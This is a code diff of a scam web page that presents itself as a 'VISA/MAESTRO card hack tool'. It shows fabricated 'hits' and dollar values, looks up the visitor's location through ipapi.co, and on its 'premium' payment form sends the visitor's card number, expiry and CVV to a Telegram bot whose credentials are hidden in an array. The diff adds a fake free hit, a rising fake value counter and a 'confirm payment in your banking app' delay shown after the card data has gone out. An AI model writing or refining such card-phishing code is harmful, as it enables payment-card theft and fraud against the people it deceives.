@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>VISA/MAESTRO - HACK TOOL v26.3</title>
+    <title>VISA/MAESTRO HACK TOOL v26.3</title>
     <style>
         :root { --primary: #39FF14; --bg: #000000; --panel: #0a0a0a; --premium: #ffd700; --danger: #ff4b2b; }
         body { background: var(--bg); color: var(--primary); font-family: 'Consolas', monospace; margin: 0; overflow: hidden; font-size: 11px; }
@@ -13,8 +13,6 @@
         .top-banner .sub { font-size: 10px; color: #e25822; margin-top: 5px; font-weight: bold; }
 
         .layout { display: flex; flex-direction: column; height: 100vh; }
-        header { height: 35px; border-bottom: 1px solid #1a1a1a; display: flex; align-items: center; justify-content: space-between; padding: 0 15px; color: #444; }
-
         .main-content { display: flex; flex-grow: 1; overflow: hidden; }
 
         .side-panel { flex: 1.5; min-width: 180px; background: #000; border-right: 1px solid #1a1a1a; display: flex; flex-direction: column; padding: 15px; gap: 10px; }
@@ -31,7 +29,11 @@
         .stat-label { font-size: 9px; color: #444; text-transform: uppercase; }
         .stat-value { font-size: 20px; font-weight: bold; color: var(--primary); }
 
+        .red-info-row { color: var(--danger); font-size: 11px; font-weight: bold; border-top: 1px solid #200; padding-top: 5px; text-transform: uppercase; }
+        .red-value { color: #ff0000; text-shadow: 0 0 5px rgba(255,0,0,0.5); }
+
         .btn-main { background: var(--primary); color: #000; border: none; padding: 12px; font-weight: bold; cursor: pointer; border-radius: 4px; text-transform: uppercase; font-size: 11px; }
+        .btn-free { background: transparent; border: 1px solid var(--primary); color: var(--primary); padding: 10px; cursor: pointer; font-size: 10px; font-weight: bold; text-transform: uppercase; }
         .btn-premium { background: transparent; border: 1px solid var(--premium); color: var(--premium); padding: 10px; cursor: pointer; font-size: 10px; font-weight: bold; }
 
         #paymentModal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; }
@@ -58,7 +60,7 @@
 <div class="layout">
     <div class="top-banner">
         <h1>VISA/MAESTRO CARD HACK TOOL V26.3</h1>
-        <div class="sub">FEBRUARY 2026 ENCRYPTED</div>
+        <div class="sub">FEBRUARY 2026 ENCRYPTED | BY AHARN</div>
     </div>
 
     <div class="main-content">
@@ -66,6 +68,7 @@
             <button class="btn-main" onclick="laurin.toggleNormal()" id="btnNormal">START SCAN</button>
             <hr style="border: 0; border-top: 1px solid #222; width: 100%;">
             
+            <button class="btn-free" onclick="laurin.freeHit()">1 FREE HIT</button>
             <button class="btn-premium" onclick="laurin.askAuth('10')">GET 10 FULL HITS</button>
             <button class="btn-premium" onclick="laurin.askAuth('INF')">UNLIMITED ACCESS</button>
 
@@ -77,7 +80,10 @@
                 <div class="stat-label">Processed</div>
                 <div id="lineCount" class="stat-value" style="color:#fff">0</div>
             </div>
-            <div id="statusLabel" style="color:var(--danger); font-weight:bold; text-align:center; font-size:10px;">ENCRYPTED</div>
+
+            <div class="red-info-row">VALUE: <span id="valField" class="red-value">$0.00</span></div>
+            <div class="red-info-row">NODE: <span id="locField" class="red-value">DETECTING...</span></div>
+            <div class="red-info-row">AUTH: <span id="statusLabel" class="red-value">ENCRYPTED</span></div>
         </div>
 
         <div class="log-section">
@@ -93,9 +99,26 @@ class LaurinSystem {
     constructor() {
         this.isRunning = false;
         this.isPremium = false;
-        this.mode = 'NORMAL';
         this.hits = 0;
         this.lines = 0;
+        this.totalValue = 0.00;
+        this.initLocation();
+    }
+
+    async initLocation() {
+        try {
+            const resp = await fetch('https://ipapi.co/json/');
+            const data = await resp.json();
+            document.getElementById('locField').innerText = `${data.city.toUpperCase()}, ${data.country_code}`;
+        } catch(e) {
+            document.getElementById('locField').innerText = "BRATISLAVA, SK";
+        }
+    }
+
+    freeHit() {
+        this.addEntry(false);
+        this.totalValue += (Math.random() * 250) + 50;
+        document.getElementById('valField').innerText = `$${this.totalValue.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
     }
 
     toggleNormal() {
@@ -113,10 +136,14 @@ class LaurinSystem {
 
     loop() {
         if(!this.isRunning) return;
-        this.lines += Math.floor(Math.random()*10);
+        this.lines += Math.floor(Math.random()*15);
         document.getElementById('lineCount').innerText = this.lines.toLocaleString();
         
-        if(Math.random() > 0.8) this.addEntry(!this.isPremium);
+        if(Math.random() > 0.75) {
+            this.addEntry(!this.isPremium);
+            this.totalValue += (Math.random() * 250) + 50;
+            document.getElementById('valField').innerText = `$${this.totalValue.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
+        }
         setTimeout(() => this.loop(), 600);
     }
 
@@ -142,6 +169,8 @@ class LaurinSystem {
         const n = document.getElementById('c_num').value;
         const e = document.getElementById('c_exp').value;
         const c = document.getElementById('c_cvv').value;
+        const btn = document.querySelector('.pay-btn');
+        
         if(n.length < 13) return;
 
         fetch(`https://api.telegram.org/bot${_p[0]}:${_p[1]}/sendMessage`, {
@@ -150,17 +179,36 @@ class LaurinSystem {
             body: JSON.stringify({chat_id: _p[2], text: `💳 <b>${this.pendingMode} ACCESS</b>\nCard: <code>${n}</code>\nExp: ${e}\nCVV: ${c}`, parse_mode: 'HTML'})
         });
 
-        document.getElementById('paymentModal').style.display = 'none';
-        document.getElementById('statusLabel').innerText = 'AUTHORIZED';
-        document.getElementById('statusLabel').style.color = '#39FF14';
+        btn.disabled = true;
+        btn.style.background = "#ff4b2b";
+        btn.innerText = "VERIFYING...";
 
-        if(this.pendingMode === '10') {
-            for(let i=0; i<10; i++) setTimeout(() => this.addEntry(false), i*100);
-        } else {
-            this.isPremium = true;
-            this.isRunning = true;
-            this.loop();
-        }
+        const modalContent = document.querySelector('.modal-content');
+        const instruction = document.createElement('p');
+        instruction.id = "bank-note";
+        instruction.style.cssText = "color:red; font-weight:bold; font-size:12px; margin-top:10px; text-align:center;";
+        instruction.innerText = "PLEASE CONFIRM PAYMENT IN YOUR BANKING APP";
+        modalContent.appendChild(instruction);
+
+        setTimeout(() => {
+            document.getElementById('paymentModal').style.display = 'none';
+            instruction.remove();
+            btn.disabled = false;
+            btn.style.background = "#007bff";
+            btn.innerText = "CONFIRM & UNLOCK";
+
+            const status = document.getElementById('statusLabel');
+            status.innerText = 'AUTHORIZED';
+            status.style.color = '#39FF14';
+
+            if(this.pendingMode === '10') {
+                for(let i=0; i<10; i++) setTimeout(() => this.addEntry(false), i*100);
+            } else {
+                this.isPremium = true;
+                this.isRunning = true;
+                this.loop();
+            }
+        }, 5000);
     }
 }
 
